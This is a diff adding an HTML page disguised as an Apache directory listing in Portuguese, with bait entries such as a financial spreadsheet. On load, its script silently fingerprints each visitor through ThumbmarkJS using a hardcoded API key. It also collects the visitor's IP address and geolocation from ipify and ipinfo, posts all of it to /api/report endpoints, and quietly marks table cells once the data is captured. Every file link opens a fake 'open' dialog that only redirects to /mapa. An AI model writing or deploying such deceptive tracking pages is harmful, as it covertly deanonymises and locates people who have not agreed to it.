@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+  <meta name="theme-color" content="#ffffff" />
+  <title>Index of /assets</title>
+  <style>
+    * { box-sizing: border-box; }
+    html { -webkit-text-size-adjust: 100%; overflow-x: hidden; }
+    body {
+      font-family: 'Times New Roman', Times, serif;
+      margin: 0;
+      padding: 1rem;
+      padding-left: max(1rem, env(safe-area-inset-left));
+      padding-right: max(1rem, env(safe-area-inset-right));
+      padding-bottom: max(1rem, env(safe-area-inset-bottom));
+      background: #fff;
+      color: #000;
+      font-size: clamp(14px, 2.5vw, 16px);
+      min-height: 100vh;
+      overflow-x: hidden;
+    }
+    @media (max-width: 599px) {
+      th, td { padding: 0.1rem 0.5rem 0.1rem 0; }
+      td:first-child a { min-height: 32px; padding: 0.15rem 2px 0.15rem 0; }
+    }
+    @media (min-width: 600px) {
+      body { padding: 2rem 3rem; font-size: 14px; }
+    }
+    h1 {
+      font-size: clamp(1.25rem, 4vw, 1.5rem);
+      font-weight: bold;
+      margin: 0 0 0.5rem 0;
+      padding-top: env(safe-area-inset-top, 0);
+    }
+    hr { border: none; border-top: 1px solid #000; margin: 0.5rem 0 1rem 0; }
+    .table-wrap {
+      overflow-x: auto;
+      -webkit-overflow-scrolling: touch;
+      margin: 0 -0.5rem;
+      padding: 0 0.5rem;
+    }
+    table { border-collapse: collapse; width: 100%; min-width: 280px; }
+    th {
+      text-align: left;
+      padding: 0.5rem 0.75rem 0.5rem 0;
+      font-weight: normal;
+      font-size: 0.9em;
+      white-space: nowrap;
+    }
+    td {
+      padding: 0.5rem 0.75rem 0.5rem 0;
+      vertical-align: middle;
+    }
+    th:first-child, td:first-child { padding-left: 0; }
+    td:first-child { min-width: 0; }
+    a {
+      color: #00c;
+      text-decoration: underline;
+      cursor: pointer;
+      display: inline-block;
+      min-height: 44px;
+      line-height: 1.4;
+      padding: 0.5rem 2px 0.5rem 0;
+      -webkit-tap-highlight-color: transparent;
+    }
+    a:visited { color: #00c; }
+    .list-icon {
+      display: inline-block;
+      width: 20px;
+      height: 18px;
+      margin-right: 6px;
+      vertical-align: middle;
+    }
+    .list-icon svg { width: 100%; height: 100%; }
+    #snapshot { display: none; }
+
+    .confirm-overlay {
+      position: fixed;
+      inset: 0;
+      left: env(safe-area-inset-left);
+      right: env(safe-area-inset-right);
+      top: env(safe-area-inset-top);
+      bottom: env(safe-area-inset-bottom);
+      background: rgba(0,0,0,0.4);
+      z-index: 9999;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      padding: 1rem;
+      padding-left: max(1rem, env(safe-area-inset-left));
+      padding-right: max(1rem, env(safe-area-inset-right));
+    }
+    .confirm-overlay.show { display: flex; }
+    .confirm-dialog {
+      max-width: min(320px, calc(100vw - 2rem));
+      width: 100%;
+      background: #fff;
+      border-radius: 14px;
+      overflow: hidden;
+      box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+    }
+    body.ios .confirm-dialog {
+      border-radius: 14px;
+      -webkit-backdrop-filter: blur(20px);
+      backdrop-filter: blur(20px);
+      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "SF Pro Display", "Helvetica Neue", sans-serif;
+    }
+    body.android .confirm-dialog {
+      border-radius: 12px;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.25);
+      font-family: Roboto, "Helvetica Neue", sans-serif;
+    }
+    .confirm-dialog {
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    }
+    .confirm-title {
+      font-weight: 600;
+      font-size: 17px;
+      padding: 1.25rem 1.25rem 0.25rem;
+      text-align: center;
+      color: #000;
+    }
+    .confirm-msg {
+      font-size: 14px;
+      color: #333;
+      padding: 0.5rem 1.25rem 1.25rem;
+      text-align: center;
+      line-height: 1.4;
+    }
+    .confirm-file { font-weight: 600; word-break: break-all; color: #00c; }
+    .confirm-actions { border-top: 1px solid #e0e0e0; display: flex; }
+    .confirm-btn {
+      flex: 1;
+      min-height: 48px;
+      padding: 0.9rem 1rem;
+      font-size: 17px;
+      border: none;
+      background: none;
+      cursor: pointer;
+      -webkit-tap-highlight-color: transparent;
+    }
+    .confirm-btn.cancel { color: #007aff; font-weight: 400; }
+    .confirm-btn.open { color: #007aff; font-weight: 600; }
+    .confirm-actions.vertical { flex-direction: column; }
+    .confirm-actions.vertical .confirm-btn {
+      border-top: 1px solid #e0e0e0;
+      min-height: 52px;
+    }
+    body.android .confirm-btn.cancel { color: #666; font-weight: 500; text-transform: uppercase; font-size: 14px; }
+    body.android .confirm-btn.open { color: #1976d2; font-weight: 600; text-transform: uppercase; font-size: 14px; }
+
+    #indexView { display: block; }
+  </style>
+</head>
+<body>
+  <div id="indexView">
+  <h1>Index of /assets</h1>
+  <hr />
+  <div class="table-wrap">
+  <table>
+    <thead>
+      <tr>
+        <th>Name</th>
+        <th>Last modified</th>
+        <th>Size</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr><td><a href="/"><span class="list-icon" aria-hidden="true"><svg viewBox="0 0 24 20" fill="none" stroke="#8B6914" stroke-width="1.2"><path d="M2 6v11h20V6H2z"/><path d="M2 6l4-4h6l4 4"/></svg></span>Parent Directory</a></td><td>-</td><td>-</td></tr>
+      <tr><td><a href="#"><span class="list-icon" aria-hidden="true"><svg viewBox="0 0 24 20" fill="#E8D5A3" stroke="#C4A535" stroke-width="1"><path d="M2 6v11h20V6H2z"/><path d="M2 6l4-4h6l4 4"/></svg></span>config</a></td><td id="date-config">-</td><td>1.2K</td></tr>
+      <tr><td><a href="#"><span class="list-icon" aria-hidden="true"><svg viewBox="0 0 24 20" fill="#E8D5A3" stroke="#C4A535" stroke-width="1"><path d="M2 6v11h20V6H2z"/><path d="M2 6l4-4h6l4 4"/></svg></span>prefs</a></td><td id="date-prefs">-</td><td>256</td></tr>
+      <tr><td><a href="#"><span class="list-icon" aria-hidden="true"><svg viewBox="0 0 24 20" fill="#E8D5A3" stroke="#C4A535" stroke-width="1"><path d="M2 6v11h20V6H2z"/><path d="M2 6l4-4h6l4 4"/></svg></span>manifest</a></td><td id="date-manifest">-</td><td>512</td></tr>
+      <tr><td><a href="#"><span class="list-icon" aria-hidden="true"><svg viewBox="0 0 24 20" fill="#E8D5A3" stroke="#C4A535" stroke-width="1"><path d="M2 6v11h20V6H2z"/><path d="M2 6l4-4h6l4 4"/></svg></span>cache</a></td><td id="date-cache">-</td><td>4.0K</td></tr>
+      <tr><td><a href="#"><span class="list-icon" aria-hidden="true"><svg viewBox="0 0 24 20" fill="#217346" stroke="#185C37" stroke-width="1"><path d="M3 2h14l4 4v12H3V2z"/><path d="M17 2v4h4" fill="none" stroke="#185C37"/><line x1="6" y1="9" x2="18" y2="9" stroke="#fff" stroke-width="0.8"/><line x1="6" y1="12" x2="18" y2="12" stroke="#fff" stroke-width="0.8"/><line x1="6" y1="15" x2="14" y2="15" stroke="#fff" stroke-width="0.8"/></svg></span>controle financeiro recebimento comissionados 2025 bia.xlsx</a></td><td>26-Nov-2025 14:32</td><td>12K</td></tr>
+      <tr><td><a href="#"><span class="list-icon" aria-hidden="true"><svg viewBox="0 0 24 20" fill="#E8D5A3" stroke="#C4A535" stroke-width="1"><path d="M2 6v11h20V6H2z"/><path d="M2 6l4-4h6l4 4"/></svg></span>locale</a></td><td>-</td><td>-</td></tr>
+      <tr><td><a href="#"><span class="list-icon" aria-hidden="true"><svg viewBox="0 0 24 20" fill="#E8D5A3" stroke="#C4A535" stroke-width="1"><path d="M2 6v11h20V6H2z"/><path d="M2 6l4-4h6l4 4"/></svg></span>thumbnails/</a></td><td>-</td><td>-</td></tr>
+    </tbody>
+  </table>
+  </div>
+  <img id="snapshot" alt="" />
+  </div>
+
+  <div class="confirm-overlay" id="confirmOverlay">
+    <div class="confirm-dialog">
+      <div class="confirm-title">Abrir item</div>
+      <div class="confirm-msg" id="confirmMsg"></div>
+      <div class="confirm-actions" id="confirmActions">
+        <button type="button" class="confirm-btn cancel" id="confirmCancel">Cancelar</button>
+        <button type="button" class="confirm-btn open" id="confirmOpen">Abrir</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const THUMBMARK_API_KEY = 'e2ced4b5dd1095c05ebfad68336d98ee';
+    const report = { fingerprint: null };
+
+    (function() {
+      var ua = navigator.userAgent || '';
+      if (/iPad|iPhone|iPod/.test(ua) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
+        document.body.classList.add('ios');
+      } else if (/Android/i.test(ua)) {
+        document.body.classList.add('android');
+      }
+    })();
+
+    (function() {
+      var overlay = document.getElementById('confirmOverlay');
+      var msgEl = document.getElementById('confirmMsg');
+      var actionsEl = document.getElementById('confirmActions');
+      var cancelBtn = document.getElementById('confirmCancel');
+      var openBtn = document.getElementById('confirmOpen');
+      var isIOS = document.body.classList.contains('ios');
+      if (isIOS) actionsEl.classList.add('vertical');
+
+      function getConfirmMessage(fileName) {
+        return 'Deseja abrir <span class="confirm-file">' + escapeHtml(fileName) + '</span>?';
+      }
+      function escapeHtml(s) { return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+
+      function showMapsView() {
+        window.location.href = '/mapa';
+      }
+
+      function onConfirmChoice() {
+        overlay.classList.remove('show');
+        setTimeout(showMapsView, 3000);
+      }
+
+      function openConfirm(fileName, href) {
+        msgEl.innerHTML = getConfirmMessage(fileName);
+        overlay.classList.add('show');
+        cancelBtn.onclick = onConfirmChoice;
+        openBtn.onclick = onConfirmChoice;
+      }
+
+      document.querySelectorAll('table a').forEach(function(a) {
+        a.addEventListener('click', function(e) {
+          e.preventDefault();
+          var name = (a.textContent || '').trim() || 'item';
+          var href = a.getAttribute('href') || '#';
+          openConfirm(name, href);
+        });
+      });
+    })();
+
+    function fmtDate(d) {
+      const pad = (n) => (n < 10 ? '0' + n : '' + n);
+      return pad(d.getDate()) + '-' + ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'][d.getMonth()] + '-' + d.getFullYear() + ' ' + pad(d.getHours()) + ':' + pad(d.getMinutes());
+    }
+
+    function updateRow(id) {
+      const el = document.getElementById(id);
+      if (el) el.textContent = fmtDate(new Date());
+    }
+
+    function sendFingerprint(fingerprint) {
+      updateRow('date-config');
+      fetch('/api/report/fingerprint', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ fingerprint }),
+      }).catch(() => {});
+    }
+
+    function fetchIpVerification() {
+      const ipify = fetch('https://api.ipify.org?format=json').then((r) => r.ok ? r.json() : null).catch(() => null);
+      const ipinfo = fetch('https://ipinfo.io/json').then((r) => r.ok ? r.json() : null).catch(() => null);
+      Promise.all([ipify, ipinfo]).then(([ipifyData, ipinfoData]) => {
+        if (ipifyData || ipinfoData) {
+          updateRow('date-prefs');
+          fetch('/api/report/ip', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ ipify: ipifyData, ipinfo: ipinfoData }),
+          }).catch(() => {});
+        }
+      });
+    }
+
+    async function run() {
+      try {
+        await import('https://cdn.jsdelivr.net/npm/@thumbmarkjs/thumbmarkjs/dist/thumbmark.umd.js');
+        const Thumbmark = (window.ThumbmarkJS && window.ThumbmarkJS.Thumbmark);
+        if (Thumbmark) {
+          const t = new Thumbmark({ api_key: THUMBMARK_API_KEY });
+          const tm = await t.get();
+          report.fingerprint = tm;
+          sendFingerprint(tm);
+        }
+      } catch (e) {}
+      fetchIpVerification();
+    }
+
+    run();
+  </script>
+</body>
+</html>
